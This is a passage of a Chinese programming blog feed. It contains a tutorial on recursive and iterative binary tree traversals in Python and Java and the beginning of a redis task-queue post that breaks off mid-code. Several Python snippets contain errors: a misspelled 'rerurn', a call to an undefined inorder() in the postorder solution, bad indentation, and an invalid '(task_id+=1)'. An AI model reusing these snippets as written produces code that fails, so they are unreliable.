    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在看面试题，基本已经知道算法这块地方是自己的薄弱点，特意复习记录一下。<br>今天写的是二叉树的前中后序遍历，我会分别用递归还有迭代的方法实现。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="前序遍历"><a href="#前序遍历" class="headerlink" title="前序遍历"></a>前序遍历</h2><p>来源LeetCode第144题。</p><h3 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h3><p>官方特意在题目中标注递归算法很简单，那么就先来看看递归算法。<br>递归算法就是先得到结点值，然后递归遍历左子树和右子树。<br>python代码如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">preorderTraversal</span><span class="params">(self,root)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">        result = []</span><br><span class="line">        result.append(root.val)</span><br><span class="line">        <span class="comment"># 由于递归返回list，需要使用extend合并两个列表。</span></span><br><span class="line">        result.extend(self.preorderTraversal(root.left))</span><br><span class="line">        result.extend(self.preorderTraversal(root.right))</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure></p><p>Java代码如下<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    List&lt;Integer&gt; result = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        preOrder(root);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">preOrder</span><span class="params">(TreeNode root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        result.add(root.val);</span><br><span class="line">        preOrder(root.left);</span><br><span class="line">        preOrder(root.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>与python大同小异。</p><h3 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h3><p>我们知道递归的本质是使用栈来实现，那么我们也可以使用一个栈来帮助我们进行迭代。<br>而栈的进入顺序为<strong>先右子树然后左子树</strong>，因为栈是先进后出的数据结构，所以我们让右子树先进栈，让左子树先出栈，才能实现root-left-right的顺序。<br>python代码如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">preorderTraversal</span><span class="params">(self, root)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">            rerurn []</span><br><span class="line">        stack = []</span><br><span class="line">        result = []</span><br><span class="line">        stack.append(root)</span><br><span class="line">        <span class="keyword">while</span> stack:</span><br><span class="line">            node = stack.pop()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> node:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            result.append(node.val)</span><br><span class="line">            stack.append(node.right)</span><br><span class="line">            stack.append(node.left)</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><br>Java代码如下<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;Integer&gt; result = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">        stack.push(root);</span><br><span class="line">        <span class="keyword">while</span>(!stack.isEmpty())&#123;</span><br><span class="line">            TreeNode temp = stack.pop();</span><br><span class="line">            result.add(temp.val);</span><br><span class="line">            <span class="keyword">if</span>(temp.right != <span class="keyword">null</span>)&#123;</span><br><span class="line">                stack.push(temp.right);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(temp.left != <span class="keyword">null</span>)&#123;</span><br><span class="line">                stack.push(temp.left);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h2><p>来自LeetCode第94题。<br>中序遍历是left-root-right的顺序，递归方法依旧很简单。</p><h3 id="递归-1"><a href="#递归-1" class="headerlink" title="递归"></a>递归</h3><p>python代码如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inorderTraversal</span><span class="params">(self, root: TreeNode)</span> -&gt; List[int]:</span></span><br><span class="line">        res = []</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">inorder</span><span class="params">(root)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> root == <span class="keyword">None</span>:</span><br><span class="line">                <span class="keyword">return</span> </span><br><span class="line">            <span class="comment"># 可以省略判断</span></span><br><span class="line">            <span class="keyword">if</span> root.left != <span class="keyword">None</span>:</span><br><span class="line">                inorder(root.left)</span><br><span class="line">            res.append(root.val)</span><br><span class="line">            <span class="keyword">if</span> root.right != <span class="keyword">None</span>:</span><br><span class="line">                inorder(root.right)</span><br><span class="line">        inorder(root)</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure></p><p>其实可以省略判断，因为函数开始就已经判断root是否为空。</p><p>Java代码如下<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        List&lt;Integer&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        helper(root,result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">helper</span><span class="params">(TreeNode root,List&lt;Integer&gt; result)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        helper(root.left,result);</span><br><span class="line">        result.add(root.val);</span><br><span class="line">        helper(root.right,result);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="迭代-1"><a href="#迭代-1" class="headerlink" title="迭代"></a>迭代</h3><p>中序遍历的迭代方法与前序遍历难一些。中序遍历需要先将<strong>所有左子树</strong>压入栈中，然后开始从二叉树左下角的节点开始出栈，将本节点的的值放入结果中，然后将该节点的右子树放入栈中。之后便可按照left-root-right的顺序将值放入结果中。<br>python代码如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inorderTraversal</span><span class="params">(self, root: TreeNode)</span> -&gt; List[int]:</span></span><br><span class="line">        stack = []</span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            <span class="keyword">while</span> root:</span><br><span class="line">                stack.append(root)</span><br><span class="line">                root = root.left</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> stack:</span><br><span class="line">                <span class="keyword">return</span> res</span><br><span class="line">            root = stack.pop()</span><br><span class="line">            res.append(root.val)</span><br><span class="line">            root = root.right</span><br></pre></td></tr></table></figure></p><p>Java代码如下<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">        List&lt;Integer&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">            <span class="keyword">while</span> (root != <span class="keyword">null</span>)&#123;</span><br><span class="line">                stack.push(root);</span><br><span class="line">                root = root.left;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (stack.isEmpty())&#123;</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            &#125;</span><br><span class="line">            root = stack.pop();</span><br><span class="line">            result.add(root.val);</span><br><span class="line">            root = root.right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们可以稍微修改下代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">        List&lt;Integer&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">while</span> (!stack.isEmpty() || root != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (root != <span class="keyword">null</span>)&#123;</span><br><span class="line">                stack.push(root);</span><br><span class="line">                root = root.left;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                root = stack.pop();</span><br><span class="line">                result.add(root.val);</span><br><span class="line">                root = root.right;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="后序遍历"><a href="#后序遍历" class="headerlink" title="后序遍历"></a>后序遍历</h2><p>LeetCode第145题。前中后序遍历官方给的难度是递增的。后序遍历难度为困难。</p><h3 id="递归-2"><a href="#递归-2" class="headerlink" title="递归"></a>递归</h3><p>当然我们如果使用递归的话就比较简单。与前序中序相似，只改变一下节点值加入结果的顺序。<br>python代码如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">postorderTraversal</span><span class="params">(self, root: TreeNode)</span> -&gt; List[int]:</span></span><br><span class="line">        res = []</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">postorder</span><span class="params">(root)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> root == <span class="keyword">None</span>:</span><br><span class="line">                <span class="keyword">return</span> </span><br><span class="line">            <span class="comment"># 可以省略判断</span></span><br><span class="line">            <span class="keyword">if</span> root.left != <span class="keyword">None</span>:</span><br><span class="line">                postorder(root.left)</span><br><span class="line">            <span class="keyword">if</span> root.right != <span class="keyword">None</span>:</span><br><span class="line">                postorder(root.right)</span><br><span class="line">            res.append(root.val)</span><br><span class="line">        inorder(root)</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure></p><p>Java代码类似<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">postorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        List&lt;Integer&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        helper(root,result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">helper</span><span class="params">(TreeNode root,List&lt;Integer&gt; result)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        helper(root.left,result);</span><br><span class="line">        helper(root.right,result);</span><br><span class="line">        result.add(root.val);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="迭代-2"><a href="#迭代-2" class="headerlink" title="迭代"></a>迭代</h3><p>困难主要在于使用迭代实现后序遍历。后序遍历的顺序为left-right-root，由于我们先获得的是root节点，之后才能获取左右子树，所以我们改变思路，<br>我们可以先从root-right-left的顺序下手，之后再反序，就可以得到后序遍历的结果。<br>由于我们使用的是栈，我们先把根节点放入栈中，然后依次放入左子树和右子树，这样栈的弹出顺序就是由右子树到左子树，那么我们的思路就确定了：<br>先将根节点push到栈中，pop出来后将值存入结果中，然后分别push左右子树到栈中，右子树先出栈，得到了右子树的值，然后得到左子树的值，即遍历顺序就为根-右子树-左子树。<br>因此，我们的入栈顺序就是为root-left-right<br>python代码如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">postorderTraversal</span><span class="params">(self, root: TreeNode)</span> -&gt; List[int]:</span></span><br><span class="line">        stack = [root]</span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        <span class="keyword">while</span> stack:</span><br><span class="line">            node = stack.pop()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> node:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            res.append(node.val)</span><br><span class="line">            stack.append(node.left)</span><br><span class="line">            stack.append(node.right)</span><br><span class="line">        <span class="keyword">return</span> res[::<span class="number">-1</span>]</span><br></pre></td></tr></table></figure></p><p>Java代码如下<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">postorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;Integer&gt; result = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">        stack.push(root);</span><br><span class="line">        <span class="keyword">while</span>(!stack.isEmpty())&#123;</span><br><span class="line">            TreeNode temp = stack.pop();</span><br><span class="line">            <span class="keyword">if</span> (temp == <span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            result.add(temp.val);</span><br><span class="line">            stack.push(temp.left);</span><br><span class="line">            stack.push(temp.right);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        Collections.reverse(result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次总结了三种二叉树的遍历方式，相比于之前，确实又加深了不少理解。三种遍历方式使用递归方法都非常简单，但是使用迭代方法就有些难度了，<br>其中前序遍历最简单，只要将root-right-left依次放进栈中便可得到结果。<br>而后序遍历与前序遍历多了一个翻转的思想，入栈顺序为root-left-right，之后反转结果，便可得到后序遍历的结果。<br>最后是中序遍历，将所有左子树放入栈中，然后从左下角的节点开始出栈，每当出栈后，把节点值放入结果中，然后将右子树放入栈中，如此迭代，便可得到left-root-right的顺序。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近在看面试题，基本已经知道算法这块地方是自己的薄弱点，特意复习记录一下。&lt;br&gt;今天写的是二叉树的前中后序遍历，我会分别用递归还有迭代的方
      
    
    </summary>
    
    
      <category term="算法" scheme="http://re0.top/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="编程" scheme="http://re0.top/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>初探celery任务队列</title>
    <link href="http://re0.top/2020/03/24/celery/"/>
    <id>http://re0.top/2020/03/24/celery/</id>
    <published>2020-03-24T08:10:00.000Z</published>
    <updated>2020-03-24T17:25:18.132Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前讲过，在自己开发的公众号后台中有一个比较费时的请求操作，由于微信限制5秒内返回，无法立即返回结果，因此我开始寻找解决办法，最终决定使用<strong>任务队列</strong>来进行实现。</p><h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><p>有些文章认为任务队列=消息队列，是一种解决方案，但我认为消息队列是任务队列的一部分，<strong>任务队列需要消息队列作支持</strong>。完整的任务队列不仅需要消息中间件（即消息队列），还需要生产者，消费者来提出任务与解决任务。<br>任务队列在架构中十分常见，常见的使用场景有</p><ul><li>费时操作交由任务队列系统异步执行，提高响应时间与吞吐量。</li><li>将请求的部分操作转交给任务队列执行，加快操作，如推送消息，发送验证码/邮件等。</li><li>定时任务。在生产环境下会有许多定时任务，如定时清理，定时备份等等，如果定时任务太多，又或者服务器数量过多，定时任务的管理就十分困难，此时任务队列就可以帮助管理员管理定时任务。</li></ul><p>市面上也有许多消息中间件供开发者使用，如rabbitMQ，rocketMQ等等，当然也可以使用redis作为消息中间件。<br>当然光有消息中间件是无法实现一个任务队列的，接下来我们手动实现一个任务队列。</p><h2 id="任务队列雏形"><a href="#任务队列雏形" class="headerlink" title="任务队列雏形"></a>任务队列雏形</h2><p>我们采用redis做消息中间件，利用redis的list数据结构，我们可以直接将list当作消息队列，作为消息存放处。同时redis还有lpush与rpop，生产者使用lpush将任务消息存放在list中，而消费者使用rpop或者使用阻塞的brpop来获取任务消息，并处理消息，之后将处理结果存在redis中，当需要结果时，从redis中取出结果。如此我们便实现了一个简单的任务队列。<br>我们假设生产者产生了一串数字，而消费者则是将数字进行简单hash处理。<br>我们可以实现一下代码<br>生产者：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> redis,random,time</span><br><span class="line">r = redis.Redis(host=<span class="string">'localhost'</span>, port=<span class="number">6379</span>, decode_responses=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">producer</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"producer开始工作"</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        random_num = random.randint(<span class="number">1</span>,<span class="number">10000</span>)</span><br><span class="line">        print(random_num)</span><br><span class="line">        r.lpush(<span class="string">"task_list"</span>,random_num)</span><br><span class="line">        time.sleep(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    producer()</span><br></pre></td></tr></table></figure><br>消费者：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> redis,random,time,hashlib</span><br><span class="line">r = redis.Redis(host=<span class="string">'localhost'</span>, port=<span class="number">6379</span>, decode_responses=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_md5</span><span class="params">(str1)</span>:</span></span><br><span class="line">    str1 = str(str1)</span><br><span class="line">    h = hashlib.md5()</span><br><span class="line">    h.update(str1.encode(encoding=<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="keyword">return</span> h.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">worker</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"worker开始工作"</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        random_num = r.brpop(<span class="string">"task_list"</span>)[<span class="number">1</span>]</span><br><span class="line">        num_md5 = get_md5(random_num)</span><br><span class="line">        r.set(random_num,num_md5)</span><br><span class="line">        print(<span class="string">"&#123;&#125; hash is: &#123;&#125;"</span>.format(random_num,r.get(random_num)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    worker()</span><br></pre></td></tr></table></figure><br>如此我们简单实现一个最原始的任务队列，接下来就是让生产者从redis中取出结果，实现方法很简单，将每个任务分配任务id，根据任务id去获取结果。我们改进代码，让producer将任务id整合进任务中。<strong>这里我们使用json将序列化对象存入list中，然后结果也是用json数据存储。</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">producer</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"producer开始工作"</span>)</span><br><span class="line">    task_id = <span class="number">0</span> <span class="comment">#初始化任务id</span></span><br><span class="line">    task = &#123;<span class="string">'task_id'</span>:task_id,<span class="string">'random_num'</span>:<span class="number">0</span>&#125; <span class="comment">#定义task结构</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        random_num = random.randint(<span class="number">1</span>,<span class="number">10000</span>)</span><br><span class="line">        new_task = copy.copy(task)</span><br><span class="line">        new_task[<span class="string">'task_id'</span>] = (task_id+=<span class="number">1</span>)</span><br><span class="line">        new_task[<span class="string">'random_num'</span>] = random_num</span><br><span class="line">        print(new_task)</span><br><span class="line">        